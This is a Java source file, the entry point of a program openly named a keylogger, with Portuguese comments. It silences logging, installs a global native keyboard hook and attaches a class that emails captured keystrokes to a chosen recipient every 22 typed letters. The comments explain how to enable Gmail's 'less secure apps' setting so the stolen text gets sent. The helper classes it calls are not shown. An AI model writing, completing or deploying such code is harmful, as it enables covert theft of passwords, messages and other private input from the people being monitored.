package br.com.keylogger;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

	public static void main(String[] args) {
		
		/**
		 * Remover log desnecessario
		 */
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		
		/**
		 * Iniciar a "revista"(subject) e o "leitor"(envio)
		 * para o envio ter sucesso, � necessario a ativa��o
		 * do acesso para aplicativos menos seguros atraves do link abaixo
		 * http://www.google.com.br/settings/security/lesssecureapps
		 * 
		 * O apliativo esta programado para enviar uma mensagem a cada 22 letras digitadas.
		 * para mudar so ir na classe capture no m�todo nativeKeyPressed
		 * e alterar o valor 22 no if para o que desejar.
		 */
		Subject captura = new Captura();
		Observer envio = new Envio(captura, "seu email aqui", "sua senha aqui", 
				"email do destinatario aqui");
		captura.addOberser(envio);
		
		/**
		 * Registrar gancho para captura
		 */
		try {
			GlobalScreen.registerNativeHook();
		} catch(NativeHookException e) {
			e.printStackTrace();
		}
		
		/**
		 * Adicionar a classe de escuta
		 */
		GlobalScreen.addNativeKeyListener((Captura)captura);
	}

}